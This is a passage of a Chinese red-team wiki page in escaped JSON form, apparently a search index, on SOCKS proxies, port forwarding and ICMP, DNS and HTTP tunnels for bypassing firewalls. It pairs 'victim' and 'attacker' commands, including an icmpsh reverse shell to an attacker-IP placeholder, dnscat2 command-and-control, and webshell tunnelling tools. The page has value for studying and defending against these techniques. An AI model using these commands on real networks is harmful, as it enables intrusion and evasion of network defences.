3.\u76ee\u6807\u670d\u52a1\u5668\u7f51\u7edc\u505a\u4e86\u7aef\u53e3\u7b56\u7565\u9650\u5236,\u53ea\u5141\u8bb8\u5916\u90e8\u8bbf\u95ee\u5185\u7f51\u768480\u7b49\u7279\u5b9a\u7aef\u53e3\u3002 \u4e0b\u8f7d\u94fe\u63a5: https://github.com/sensepost/reDuh \u53c2\u8003\u94fe\u63a5: https://www.jianshu.com/p/cd3dae49385d Tunna \u4e00\u6b3e\u795e\u5947\u7684\u5de5\u5177\uff0c\u5b83\u53ef\u4ee5\u901a\u8fc7HTTP\u5c01\u88c5\u96a7\u9053\u901a\u4fe1\u4efb\u4f55TCP\uff0c\u4ee5\u53ca\u7528\u4e8e\u7ed5\u8fc7\u9632\u706b\u5899\u73af \u5883\u4e2d\u7684\u7f51\u7edc\u9650\u5236\u3002 \u6ce8\uff1aTunna\u4ee3\u7406\u5e76\u4e0d\u662f\u975e\u5e38\u7a33\u5b9a\uff0c\u7ecf\u5e38\u51fa\u73b0\u6389\u7ebf\u60c5\u51b5\uff0c\u5c24\u5176\u662f\u4f7f\u7528Tunna\u4ee3\u7406\u8fdc\u7a0b \u8fde\u63a5\u7684\u6d41\u91cf\u65f6\uff0c\u7ecf\u5e38\u6389\u7ebf\u3002\u4f46\u662f\u4f7f\u7528Tunna\u8bbf\u95ee\u5185\u7f51web\u670d\u52a1\u8fd8\u7b97\u7a33\u5b9a\u3002 \u4e0b\u8f7d\u94fe\u63a5: https://github.com/SECFORCE/Tunna \u53c2\u8003\u94fe\u63a5: https://blog.csdn.net/limb0/article/details/103856835 reGeorg reGeorg\u662freDuh\u7684\u5347\u7ea7\u7248 \u4e0b\u8f7d\u94fe\u63a5: https://github.com/sensepost/reGeorg \u53c2\u8003\u94fe\u63a5: https://blog.csdn.net/qq_17204441/article/details/888340 95 Weevely weevely\u662f\u4e00\u6b3e\u4f7f\u7528python\u7f16\u5199\u7684webshell\u5de5\u5177\uff0c\u96c6webshell\u751f\u6210\u548c\u8fde\u63a5\u4e8e\u4e00 \u8eab\uff0c\u91c7\u7528c/s\u6a21\u5f0f\u6784\u5efa\uff0c\u53ef\u4ee5\u7b97\u4f5c\u662flinux\u4e0b\u7684\u4e00\u6b3ephp\u83dc\u5200\u66ff\u4ee3\u5de5\u5177\uff0c\u5177\u6709\u5f88\u597d\u7684 \u9690\u853d\u6027\uff08\u751f\u6210\u968f\u673a\u53c2\u6570\u4e14base64\u52a0\u5bc6\uff09\uff0c\u5728linux\u4e0a\u4f7f\u7528\u65f6\u8fd8\u662f\u5f88\u7ed9\u529b\u7684\uff08\u96c6\u670d\u52a1 \u5668\u9519\u8bef\u914d\u7f6e\u5ba1\u8ba1\uff0c\u540e\u95e8\u653e\u7f6e\uff0c\u66b4\u529b\u7834\u89e3\uff0c\u6587\u4ef6\u7ba1\u7406\uff0c\u8d44\u6e90\u641c\u7d22\uff0c\u7f51\u7edc\u4ee3\u7406\uff0c\u547d\u4ee4\u6267 \u884c\uff0c\u6570\u636e\u5e93\u64cd\u4f5c\uff0c\u7cfb\u7edf\u4fe1\u606f\u6536\u96c6\u53ca\u7aef\u53e3\u626b\u63cf\u7b49\u529f\u80fd\uff09 \u4e0b\u8f7d\u5730\u5740: http://epinna.github.com/Weevely/ \u53c2\u8003\u94fe\u63a5: https://www.cnblogs.com/lingerhk/p/4009073.html ABPTTS Abptts\u662f\u4e00\u6b3e\u57fa\u4e8epython2.7\u7684http\u52a0\u5bc6\u96a7\u9053\u5de5\u5177\uff0cAbptts\u80fd\u505a\u7684\u5f88\u591a,\u7f3a\u70b9\u662f \u4e0d\u652f\u6301PHP \u901a\u8fc7http\u52a0\u5bc6\u96a7\u9053\u8f6c\u53d1\u81f3\u76ee\u6807\u5185\u7f51\u4e0b\u6307\u5b9a\u7684\u5355\u4e2aTCP\u7aef\u53e3 \u901a\u8fc7http\u52a0\u5bc6\u96a7\u9053\u540c\u65f6\u8f6c\u53d1\u81f3\u76ee\u6807\u5185\u7f51\u4e0b\u7684\u591a\u53f0\u673a\u5668\u4e0a\u7684\u591a\u4e2atcp\u7aef\u53e3 \u628assh\u96a7\u9053\u5305\u88f9\u5728http\u52a0\u5bc6\u96a7\u9053\u4e2d\u4f20\u9012\uff0c\u5bf9\u76ee\u6807\u4e8c\u7ea7\u5185\u7f51\u8fdb\u884c\u7a7f\u900f \u4e0b\u8f7d\u5730\u5740: https://github.com/nccgroup/ABPTTS.git \u53c2\u8003\u94fe\u63a5: https://blog.csdn.net/include_heqile/article/details/850 08629 0x03 \u7aef\u53e3\u8f6c\u53d1\u7bc7 \u00b6 \u7406\u8bba\u4e0a,\u4efb\u4f55\u63a5\u5165\u4e92\u8054\u7f51\u7684\u8ba1\u7b97\u673a\u90fd\u662f\u53ef\u8bbf\u95ee\u7684,\u4f46\u5982\u679c\u76ee\u6807\u4e3b\u673a \u5728\u5185\u7f51\u4e2d,\u6211\u4eec\u53c8\u60f3\u548c\u8be5\u76ee\u6807\u4e3b\u673a\u8fdb\u884c\u901a\u4fe1\u7684\u8bdd,\u9664\u4e86\u505asocks\u4ee3\u7406\u548cht tp\u96a7\u9053\u5916,\u6211\u4eec\u8fd8\u53ef\u4ee5\u4f7f\u7528\u7aef\u53e3\u8f6c\u53d1\u7684\u65b9\u6cd5\u6765\u4e0e\u76ee\u6807\u4e3b\u673a\u8fdb\u884c\u901a\u4fe1\u3002 \u6587\u7ae0\u5f00\u59cb\u63d0\u5230\u7684\u56db\u79cd\u573a\u666f,\u524d\u4e09\u79cd\u573a\u666f\u90fd\u662f\u6709\u5e38\u7528\u7684\u7aef\u53e3\u8f6c\u53d1\u5de5\u5177 \u7684\u3002 1. Frp \u4e0b\u8f7d\u5730\u5740: https://github.com/fatedier/frp/releases \u53c2\u8003\u94fe\u63a5: http://www.secflag.com/archives/373.html 2. Msf+Portfwd \u53c2\u8003\u94fe\u63a5: https://blog.csdn.net/DarkHQ/article/details/80411158 3. Lcx lcx\u662f\u4e00\u6b3e\u5f3a\u5927\u7684\u5185\u7f51\u7aef\u53e3\u8f6c\u53d1\u5de5\u5177,\u5df2\u7ecf\u88ab\u6740\u6bd2\u8f6f\u4ef6\u5217\u4e3a\u6728\u9a6c,\u7528\u4e8e\u5c06\u5185\u7f51\u4e3b\u673a\u5f00 \u653e\u7684\u5185\u90e8\u7aef\u53e3\u6620\u5c04\u5230\u5916\u7f51\u4e3b\u673a(\u6709\u516c\u7f51IP)\u4efb\u610f\u7aef\u53e3. \u5b83\u662f\u4e00\u6b3e\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5\u5728\u6709\u6743\u9650\u7684webshell\u4e0b\u6267\u884c\uff0c\u6b63\u56e0\u5982\u6b64lcx\u5e38\u88ab \u8ba4\u4e3a\u662f\u4e00\u6b3e\u9ed1\u5ba2\u5165\u4fb5\u5de5\u5177\uff0clcx\u5728\u5185\u7f51\u5165\u4fb5\u6e17\u900f\u4e2d\u8d77\u7740\u91cd\u8981\u7684\u89d2\u8272\u3002lcx\u8fdb\u884c\u7aef\u53e3 \u8f6c\u53d1\u7684\u539f\u7406\u5c31\u662f\u4f7f\u4e0d\u540c\u7aef\u53e3\u4e4b\u95f4\u5f62\u6210\u4e00\u4e2a\u56de\u8def\u3002\u5b83\u5e38\u7528\u4e8e\u5916\u7f51\u8fde\u63a5\u5185\u7f513389\u7b49\u7aef\u53e3 \u3002 \u4e0b\u8f7d\u5730\u5740:\u81ea\u884c\u641c\u7d22\u5f15\u64ce \u53c2\u8003\u94fe\u63a5: https://blog.bbskali.cn/356.html 4. Socat \u4e0b\u8f7d\u5730\u5740: http://www.dest-unreach.org/socat/ \u53c2\u8003\u94fe\u63a5: https://www.cnblogs.com/iamlehaha/p/6540695.html 5. SSH \u672c\u5730\u7aef\u53e3\u8f6c\u53d1: \u00b6 ssh-CfNg-Lport1:127.0.0.1:port2user@host \u53c2\u6570\uff1a-L\u672c\u5730\u7f51\u5361\u5730\u5740:\u672c\u5730\u7aef\u53e3:\u76ee\u6807\u5730\u5740:\u76ee\u6807\u7aef\u53e3 \u8fdc\u7a0b\u7aef\u53e3\u8f6c\u53d1\uff1a \u00b6 ssh-CfNg-Rport2:127.0.0.1:port1user@hsst \u53c2\u6570\uff1a-R\u8fdc\u7a0b\u7f51\u5361\u5730\u5740:\u8fdc\u7a0b\u7aef\u53e3:\u76ee\u6807\u5730\u5740:\u76ee\u6807\u7aef\u53e3 \u52a8\u6001\u7aef\u53e3\u8f6c\u53d1 \u00b6 ssh-Dlocalhost:2000root@103.59.22.17 \u53c2\u6570\uff1a-D\u672c\u5730\u7f51\u5361\u5730\u5740:\u672c\u5730\u7aef\u53e3 6. Netsh netsh\u662fwindows\u4e0b\u63d0\u4f9b\u7f51\u7edc\u7ba1\u7406\u7684\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u5b83\u662f\u4e00\u4e2a\u4ea4\u4e92\u5f0f\u7684shell,\u6d89\u53ca\u5230 \u4e0a\u4e0b\u6587\u7684\u6982\u5ff5\u3002\u6211\u4eec\u5728\u4ea4\u4e92\u5f0f\u4e0b\u9762\u8fdb\u5165\u76f8\u5e94\u7684\u4e0a\u4e0b\u6587\uff0c\u8fdb\u884c\u53c2\u6570\u7684\u8bbe\u7f6e\u3002\u4e5f\u53ef\u4ee5\u76f4 \u63a5\u4e0b\u9762\u8fd9\u6837\u975e\u4ea4\u4e92\u5f0f\u7684\u8fdb\u884c\u7aef\u53e3\u8f6c\u53d1\u3002 `netshinterfaceipv6install \u8f6c\u53d1 \u00b6 netshinterfaceportproxyaddv4tov4listenaddress=10.10.18.1listenpo rt=4455connectaddress=10.10.12.1connectport=8080 \u5220\u9664\u8f6c\u53d1 \u00b6 netshinterfaceportproxydeletev4tov4listenaddress={B\u7684IP}listenpo rt={B\u7684\u7aef\u53e3} 0x04 socks\u4ee3\u7406\u5ba2\u6237\u7aef \u00b6 \u5728\u505a\u597dsocks\u4ee3\u7406\u4ee5\u540e,\u6211\u4eec\u9700\u8981\u4f7f\u7528socks\u5ba2\u6237\u7aef\u6302\u4e0a\u4ee3\u7406,\u624d\u80fd \u8bbf \u95ee \u76ee \u6807 \u73af \u5883 , \u5728 \u8fd9 \u91cc \u8bf4 \u4e00 \u4e0b \u4e2a \u4eba \u7684 \u914d \u7f6e , \u5c0f\u7f16\u5de5\u4f5c\u673a\u4e3amac,socks\u4ee3\u7406\u5ba2\u6237\u7aef\u56fe\u5f62\u5316\u5de5\u5177\u4f7f\u7528proxifier,\u547d\u4ee4\u884c \u5de5\u5177\u4f7f\u7528proxychains4,\u53e6\u5916\u6211\u6bd4\u8f83\u559c\u6b22\u5355\u72ec\u914d\u7f6e,burpsuite\u8d70\u4ee3\u7406 \u5c31\u5728burpsuite\u914d\u7f6e,\u7ec8\u7aef\u8d70\u4ee3\u7406\u5c31\u5728\u7ec8\u7aef\u914d\u7f6e\u4ee3\u7406,\u6d4f\u89c8\u5668\u9700\u8981\u8d70\u4ee3\u7406 \u5c31\u5728\u6d4f\u89c8\u5668\u914d\u7f6e\u4ee3\u7406\u3002 1.proxychains \u9700\u8981\u4fee\u6539mac\u7684\u914d\u7f6e \u4fee\u6539\u914d\u7f6e\u53c2\u8003\u94fe\u63a5: https://zhuanlan.zhihu.com/p/21281236 \u4f7f\u7528\u65b9\u6cd5\u53c2\u8003\u94fe\u63a5: https://www.cnblogs.com/wyet/p/7868395.html 2.proxifier \u8fd9\u4e2a\u5de5\u5177\u597d\u7528,\u8de8\u5e73\u53f0\u4f7f\u7528 \u53c2\u8003\u94fe\u63a5: http://www.hopol.cn/2018/05/1142/ 3 burpsuite \u6302socks\u4ee3\u7406 \u53c2\u8003\u94fe\u63a5: https://www.cnblogs.com/hookjoy/p/10759555.html 4 chrome \u6302socks\u4ee3\u7406 \u63d2\u4ef6:SwitchyOmega 5 \u7ec8\u7aef\u8d70\u4ee3\u7406 \u6302\u4ee3\u7406\u547d\u4ee4alias proxy='export all_proxy=socks5://127.0.0.1:1086 \u53d6\u6d88\u4ee3\u7406\u547d\u4ee4alias unproxy='unset all_pro","title":"\u4ee3\u7406\u8f6c\u53d1\u4e0e\u96a7\u9053"},{"location":"redteam/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93/#0x01-socks","text":"\u9488\u5bf9\u7b2c\u4e00\u79cd\u60c5\u51b5,\u7531\u4e8e\u9632\u706b\u5899\u5bf9\u51fa\u53e3\u6d41\u91cf\u6ca1\u6709\u4efb\u4f55\u7aef\u53e3\u9650\u5236,\u6211\u4eec\u7684\u53ef\u9009\u62e9\u7684\u65b9\u6848\u975e\u5e38\u7075\u6d3b.\u5e38\u7528\u7684\u65b9\u6cd5\u6709 1. \u6b63\u5411\u8fde\u63a5,\u5c06shell\u8f6c\u53d1\u5230\u67d0\u4e2a\u7aef\u53e3,\u6216\u8005\u5185\u7f51\u4e3b\u673a\u7684\u7aef\u53e3\u6216\u8005\u76d1\u542cSOCKS5\u7aef\u53e3\u5f00\u59cb\u76d1\u542c,\u7b49\u5f85\u5916\u9762\u7684\u653b\u51fb\u8005\u8fde\u63a5(\u6b64\u65f6,\u5916\u7f51\u7684\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u6765\u8fde\u63a5\u88ab\u653b\u51fb\u8005\u7684\u7aef\u53e3) \u53cd\u5411\u8fde\u63a5,\u53d7\u5bb3\u8005\u4e3b\u673a\u901a\u8fc7\u6307\u5b9a\u653b\u51fb\u8005\u6b63\u5728\u76d1\u542c\u7684IP\u548cport,\u5c06shell\u6216\u5185\u7f51\u7aef\u53e3\u7b49\u8f6c\u53d1\u5230\u653b\u51fb\u8005\u73af\u5883,\u4e5f\u53ef\u5b9e\u73b0socks5\u53cd\u5411\u4ee3\u7406\u3002 \u5176\u4e2d\u53ef\u4ee5\u7528\u6765\u505asocks5\u4ee3\u7406\u7684\u5de5\u5177\u6709: Frp: frp\u662f\u4e00\u4e2a\u9ad8\u6027\u80fd\u7684\u53cd\u5411\u4ee3\u7406\u5e94\u7528,\u53ef\u4ee5\u8f7b\u677e\u5730\u8fdb\u884c\u5185\u7f51\u7a7f\u900f,\u5bf9\u5916\u7f51\u63d0\u4f9b\u670d\u52a1,\u652f \u6301tcp,http,https\u7b49\u534f\u8bae\u7c7b\u578b\u3002 \u4e0b\u8f7d\u5730\u5740: https://github.com/fatedier/frp/releases \u63a8\u8350\u6587\u7ae0: https://www.jianshu.com/p/e0581ee84323 Earthworm(ew) \u4e00\u5957\u8f7b\u91cf\u4fbf\u643a\u4e14\u529f\u80fd\u5f3a\u5927\u7684\u7f51\u7edc\u7a7f\u900f\u5de5\u5177\uff0c\u57fa\u4e8e\u6807\u51c6C\u5f00\u53d1\uff0c\u5177\u6709socks5\u4ee3\u7406\u3001\u7aef \u53e3\u8f6c\u53d1\u548c\u7aef\u53e3\u6620\u5c04\u4e09\u5927\u529f\u80fd\u3002 \u4e0b\u8f7d\u5730\u5740:(\u6682\u4e0d\u63d0\u4f9b) \u63a8\u8350\u6587\u7ae0: http://rootkiter.com/EarthWorm/ Ssocks sSocks\u662f\u4e00\u4e2asocks\u4ee3\u7406\u5de5\u5177\u5957\u88c5\uff0c\u53ef\u7528\u6765\u5f00\u542fsocks\u4ee3\u7406\u670d\u52a1\uff0c\u652f\u6301socks5\u9a8c \u8bc1\uff0c\u652f\u6301IPV6\u548cUDP\uff0c\u5e76\u63d0\u4f9b\u53cd\u5411socks\u4ee3\u7406\u670d\u52a1\uff0c\u5373\u5c06\u8fdc\u7a0b\u8ba1\u7b97\u673a\u4f5c\u4e3asocks\u4ee3 \u7406\u670d\u52a1\u7aef\uff0c\u53cd\u5f39\u56de\u672c\u5730\uff0c\u6781\u5927\u65b9\u4fbf\u5185\u7f51\u7684\u6e17\u900f\u6d4b\u8bd5 \u4e0b\u8f7d\u5730\u5740:( http://sourceforge.net/projects/ssocks/ ) \u63a8\u8350\u6587\u7ae0: https://blog.csdn.net/God_XiangYu/article/details/100132 929 msf\u505asocks\u4ee3\u7406 \u63a8\u8350\u6587\u7ae0: https://www.cnblogs.com/dgjnszf/p/12114358.html CobaltStrike\u505asocks\u4ee3\u7406 \u63a8\u8350\u6587\u7ae0: https://www.secshi.com/6575.htms \u9488\u5bf9\u7b2c\u4e8c\u79cd\u60c5\u51b5,\u6211\u4eec\u53ef\u4ee5\u53cd\u5411\u8fde\u63a5\u53d7\u5bb3\u8005\u4e3b\u673a,\u901a\u8fc7\u6307\u5b9a\u653b\u51fb\u8005 \u6b63\u5728\u76d1\u542c\u7684IP\u548cport,\u5c06shell,\u5185\u7f51\u7aef\u53e3\u7b49\u8f6c\u53d1\u5230\u653b\u51fb\u8005\u56e0\u4e3a\u53ea\u9650\u5236\u5165 \u7ad9\u6d41\u91cf,\u51fa\u7ad9\u672a\u505a\u9650\u5236,\u6240\u4ee5\u505asocks\u4ee3\u7406\u65b9\u6cd5\u4f9d\u7136\u9002\u7528","title":"0x01 socks\u4ee3\u7406\u670d\u52a1\u7aef\u7bc7"},{"location":"redteam/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93/#0x02","text":"\u9488 \u5bf9 \u7b2c \u4e09 \u79cd \u548c \u7b2c \u56db \u79cd \u60c5 \u51b5 , socks\u4ee3\u7406\u7684\u65b9\u6cd5\u5c31\u53d7\u9650\u5236,\u56e0\u4e3a\u7aef\u53e3\u6709\u9650,\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u9690\u853d\u96a7\u9053\u6280\u672f ,\u628a\u5185\u7f51\u670d\u52a1\u5668\u7684\u7aef\u53e3\u901a\u8fc7http/https\uff0cICMP\uff0cDNS\u96a7\u9053\u8f6c\u53d1\u5230\u672c\u673a, \u5f62\u6210\u4e00\u4e2a\u56de\u8def\u3002\u7528\u4e8e\u76ee\u6807\u670d\u52a1\u5668\u5728\u5185\u7f51\u6216\u505a\u4e86\u7aef\u53e3\u7b56\u7565\u7684\u60c5\u51b5\u4e0b\u8fde\u63a5 \u76ee\u6807\u670d\u52a1\u5668\u5185\u90e8\u5f00\u653e\u7aef\u53e3\u3002\u5b83\u5229\u7528webshell\u5efa\u7acb\u4e00\u4e2asocks\u4ee3\u7406\u8fdb\u884c \u5185\u7f51\u7a7f\u900f\u5e38\u89c1\u7684\u9690\u853d\u96a7\u9053\u5de5\u5177\u6709\u4ee5\u4e0b\u51e0\u79cd\u3002","title":"0x02 \u9690\u853d\u96a7\u9053\u7bc7"},{"location":"redteam/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93/#icmp","text":"ICMP\u96a7\u9053\u7684\u539f\u7406\uff1a\u57fa\u4e8eIP\u534f\u8bae\uff0c\u5c06TCP/UDP\u6570\u636e\u5305\u5c01\u88c5\u5230ICMP\u6570\u636e\u5305\u4e2d\uff0c\u7ed5\u8fc7\u9632\u706b\u5899\uff0c\u5b9e\u73b0\u51fa\u7f51\u3002ICMP\u96a7\u9053\u7684\u5e94\u7528\u573a\u666f\uff1a\u4e0a\u5c42\u534f\u8bae\u4f8b\u5982HTTP\u534f\u8bae\u3001DNS\u534f\u8bae\u548c\u6b63\u53cd\u5411\u7aef\u53e3\u8f6c\u53d1\u90fd\u5931\u8d25\u65f6\uff0c\u53ef\u4ee5\u5c1d\u8bd5ICMP\u51fa\u7f51\u3002ICMP\u7684\u5e38\u7528\u5de5\u5177\uff1aicmpsh\u3001icmptunnel\u3001ptun 1\u3001icmpsh \u5de5\u5177\u5b89\u88c5 git clone https://github.com/inquisb/icmpsh.git #\u4e0b\u8f7d\u5730\u5740 apt-get install python-impacket #\u5b89\u88c5\u4f9d\u8d56 sysctl -w net.ipv4.icmp_echo_ignore_all=1","title":"\u4e00\u3001ICMP\u96a7\u9053"},{"location":"redteam/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93/#icmp_1","text":"\u88ab\u653b\u51fb\u8005\u6267\u884c icmpsh.exe -t \u653b\u51fb\u8005IP \u653b\u51fb\u8005\u6267\u884c python icmpsh_m.py \u653b\u51fb\u8005IP \u88ab\u653b\u51fb\u8005IP 2\u3001icmptunnel \u5de5\u5177\u5b89\u88c5 git clone https://github.com/jamesbarlow/icmptunnel.git cd icmptunnel make sysctl -w net.ipv4.icmp_echo_ignore_all=1","title":"\u5173\u95ed\u672c\u5730\u7684ICMP\u5e94\u7b54"},{"location":"redteam/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93/#icmp_2","text":"\u653b\u51fb\u8005\u6267\u884c \u4e00\u4e2a\u7ec8\u7aef\u6267\u884c ./icmptunnel \u2013s \u53e6\u4e00\u4e2a\u7ec8\u7aef\u6267\u884c /sbin/ifconfig tun0 10.0.0.1 netmask 255.255.255.0 \u88ab\u653b\u51fb\u8005\u6267\u884c \u4e00\u4e2a\u7ec8\u7aef\u6267\u884c sysctl -w net.ipv4.icmp_echo_ignore_all=1 ./icmptunnel \u653b\u51fb\u8005IP \u53e6\u4e00\u4e2a\u7ec8\u7aef\u6267\u884c /sbin/ifconfig tun0 10.0.0.2 netmask 255.255.255.0 3\u3001ptunnel \u5de5\u5177\u5b89\u88c5 wget https://github.com/esrrhs/pingtunnel/releases(\u6700\u65b0\u7684release\u4e0b\u8f7d\u5730 \u5740) sudo unzip pingtunnel_linux64.zip \u653b\u51fb\u8005\u6267\u884c echo 1 >/proc/sys/net/ipv4/icmp_echo_ignore_all sudo ./pingtunnel -type server \u88ab\u653b\u51fb\u8005\u6267\u884c // client, Forward udp pingtunnel -type client -l LOCAL_IP:4455 -s SERVER_IP -t SERVER_IP:4455 // client, Forward tcp pingtunnel -type client -l LOCAL_IP:4455 -s SERVER_IP -t SERVER_IP:4455 -tcp 1 // client, Forward sock5, implicitly open tcp, so no target server is needed pingtunnel -type client -l LOCAL_IP:4455 -s SERVER_IP -sock5 1 \u4e8c\u3001DNS\u96a7\u9053 DNS\u96a7\u9053\u7684\u539f\u7406\uff1a\u57fa\u4e8eUDP\u534f\u8bae\uff0c\u5c06TCP/UDP\u6570\u636e\u5305\u5c01\u88c5\u5230dns\u7684 \u6570\u636e\u5305\u4e2d\uff0c\u7ed5\u8fc7\u9632\u706b\u5899\uff0c\u5b9e\u73b0\u51fa\u7f51\u3002 DNS\u96a7\u9053\u7684\u5e94\u7528\u573a\u666f\uff1a\u4e0a\u5c42\u534f\u8bae\u4f8b\u5982HTTP\u534f\u8bae\u3001\u6b63\u53cd\u5411\u7aef\u53e3\u8f6c\u53d1\u90fd \u5931\u8d25\u65f6\uff0c\u53ef\u4ee5\u5c1d\u8bd5DNS\u534f\u8bae\u51fa\u7f51\u3002 DNS\u7684\u5e38\u7528\u5de5\u5177\uff1adnscat2\u3001dns2tcp\u3001iodine 1 \u3001 dnscat2 \u5de5\u5177\u5b89\u88c5 server\u7aef\u5b89\u88c5\uff1a\u9700\u8981ruby\u73af\u5883\u3001\u5b89\u88c5gem\u3001ruby\u3001dnscat2\u670d\u52a1\u7aef yum install gem rm /usr/bin/ruby wget https://cache.ruby-lang.org/pub/ruby/2.5/ruby-2.5.0.tar.gz tar -zxvf ruby-2.5.0.tar.gz cd ruby-2.5.0 mkdir -p /usr/local/ruby ./configure --prefix=/usr/local/ruby make && make install ln -s /usr/local/ruby/bin/ruby /usr/bin/ruby git clone https://github.com/iagox86/dnscat2.git cd /server gem install bunlder ln /usr/local/ruby/bin/bunlder /usr/bin/bunlder bunlder install \u5ba2\u6237\u7aef\u5b89\u88c5\uff1a \u4e0b\u8f7d\u5730\u4e3b\uff1a https://downloads.skullsecurity.org/dnscat2/ powershell\u5ba2\u6237\u7aef\uff1a https://codeload.github.com/lukebaggett/dnscat2 -powershell/zip/master \u653b\u51fb\u8005\u6267\u884c ruby dnscat2.rb yourdomain.****.top -e open -c password --no\ufffecache \u88ab\u653b\u51fb\u8005\u6267\u884c ./dnscat --secret=password yourdomain.target.com 2\u3001dns2tcp \u5de5\u5177\u5b89\u88c5 su - #\u8fdb\u5165root\u7528\u6237 apt-get install update apt-get install dns2tcp #\u5b9e\u9645\u4e0a\u662f\u540c\u65f6\u5b89\u88c5\u4e86dns2tcp\u7684\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef windows\u5ba2\u6237\u7aef\uff1a https://pan.baidu.com/s/1w-dpn0US9SmfjqdXuHS4aA\u63d0\u53d6\u7801 : tkgd) \u653b\u51fb\u8005\u6267\u884c dns2tcpd -f /etc/dns2tcpd.conf -F -d 2 \u88ab\u653b\u51fb\u8005\u6267\u884c ./dns2tcpc.exe -r c2 -z dnsc2.test.com target_ip -l 5353 -d 2 3\u3001iodine \u5de5\u5177\u5b89\u88c5 sudo apt-get install iodine \u653b\u51fb\u8005\u6267\u884c sudo iodined -c -P 123pass ClientIP(\u5ba2\u6237\u7aefIP) domain.com -DDD \u88ab\u653b\u51fb\u8005\u6267\u884c sudo iodine -f -P 123pass serverIP(\u670d\u52a1\u5668IP) domain.com -r \u4e09\u3001HTTP\u96a7\u9053\u5de5\u5177\u7bc7 HTTP\u96a7\u9053\u7684\u539f\u7406\uff1a\u57fa\u4e8eHTTP\u534f\u8bae\uff0c\u5c06TCP/UDP\u6570\u636e\u5305\u5c01\u88c5\u5230HTTP \u7684\u6570\u636e\u5305\u4e2d\uff0c\u7ed5\u8fc7\u9632\u706b\u5899\uff0c\u5b9e\u73b0\u51fa\u7f51\u3002 HTTP\u96a7\u9053\u7684\u5e94\u7528\u573a\u666f\uff1a\u53ea\u5141\u8bb8HTTP\u534f\u8bae\u51fa\u7f51\uff0c\u590d\u7528WEB\u7aef\u53e3\u3002 HTTP\u96a7\u9053\u7684\u5e38\u7528\u5de5\u5177\uff1aReduh\u3001Tunna\u3001reGeorg\u3001Weevely\u3001AB PTTS Reduh \u4f7f\u7528\u6761\u4ef6: 1.\u83b7\u53d6\u76ee\u6807\u670d\u52a1\u5668webshell,\u4e14\u53ef\u4ee5\u4e0a\u4f20reDuh\u670d\u52a1\u7aef\u5bf9\u5e94\u811a\u672c\u6587\u4ef6\u3002 2.\u77e5\u9053\u76ee\u6807\u670d\u52a1\u5668\u5f00\u653e\u7684\u5185\u7f51\u7aef\u53e3,\u5982\u8fdc\u7a0b\u684c\u9762\u7684\u7aef\u53e3\u662f3389\u3002 3.\u76ee\u6807\u670d\u52a1\u5668\u7f51\u7edc\u505a\u4e86\u7aef\u53e3\u7b56\u7565\u9650\u5236,\u53ea\u5141\u8bb8\u5916\u90e8\u8bbf\u95ee\u5185\u7f51\u768480\u7b49\u7279\u5b9a\u7aef\u53e3\u3002 \u4e0b\u8f7d\u94fe\u63a5: https://github.com/sensepost/reDuh \u53c2\u8003\u94fe\u63a5: https://www.jianshu.com/p/cd3dae49385d Tunna \u4e00\u6b3e\u795e\u5947\u7684\u5de5\u5177\uff0c\u5b83\u53ef\u4ee5\u901a\u8fc7HTTP\u5c01\u88c5\u96a7\u9053\u901a\u4fe1\u4efb\u4f55TCP\uff0c\u4ee5\u53ca\u7528\u4e8e\u7ed5\u8fc7\u9632\u706b\u5899\u73af \u5883\u4e2d\u7684\u7f51\u7edc\u9650\u5236\u3002 \u6ce8\uff1aTunna\u4ee3\u7406\u5e76\u4e0d\u662f\u975e\u5e38\u7a33\u5b9a\uff0c\u7ecf\u5e38\u51fa\u73b0\u6389\u7ebf\u60c5\u51b5\uff0c\u5c24\u5176\u662f\u4f7f\u7528Tunna\u4ee3\u7406\u8fdc\u7a0b \u8fde\u63a5\u7684\u6d41\u91cf\u65f6\uff0c\u7ecf\u5e38\u6389\u7ebf\u3002\u4f46\u662f\u4f7f\u7528Tunna\u8bbf\u95ee\u5185\u7f51web\u670d\u52a1\u8fd8\u7b97\u7a33\u5b9a\u3002 \u4e0b\u8f7d\u94fe\u63a5: https://github.com/SECFORCE/Tunna \u53c2\u8003\u94fe\u63a5: https://blog.csdn.net/limb0/article/details/103856835 reGeorg reGeorg\u662freDuh\u7684\u5347\u7ea7\u7248 \u4e0b\u8f7d\u94fe\u63a5: https://github.com/sensepost/reGeorg \u53c2\u8003\u94fe\u63a5: https://blog.csdn.net/qq_17204441/article/details/888340 95 Weevely weevely\u662f\u4e00\u6b3e\u4f7f\u7528python\u7f16\u5199\u7684webshell\u5de5\u5177\uff0c\u96c6webshell\u751f\u6210\u548c\u8fde\u63a5\u4e8e\u4e00 \u8eab\uff0c\u91c7\u7528c/s\u6a21\u5f0f\u6784\u5efa\uff0c\u53ef\u4ee5\u7b97\u4f5c\u662flinux\u4e0b\u7684\u4e00\u6b3ephp\u83dc\u5200\u66ff\u4ee3\u5de5\u5177\uff0c\u5177\u6709\u5f88\u597d\u7684 \u9690\u853d\u6027\uff08\u751f\u6210\u968f\u673a\u53c2\u6570\u4e14base64\u52a0\u5bc6\uff09\uff0c\u5728linux\u4e0a\u4f7f\u7528\u65f6\u8fd8\u662f\u5f88\u7ed9\u529b\u7684\uff08\u96c6\u670d\u52a1 \u5668\u9519\u8bef\u914d\u7f6e\u5ba1\u8ba1\uff0c\u540e\u95e8\u653e\u7f6e\uff0c\u66b4\u529b\u7834\u89e3\uff0c\u6587\u4ef6\u7ba1\u7406\uff0c\u8d44\u6e90\u641c\u7d22\uff0c\u7f51\u7edc\u4ee3\u7406\uff0c\u547d\u4ee4\u6267 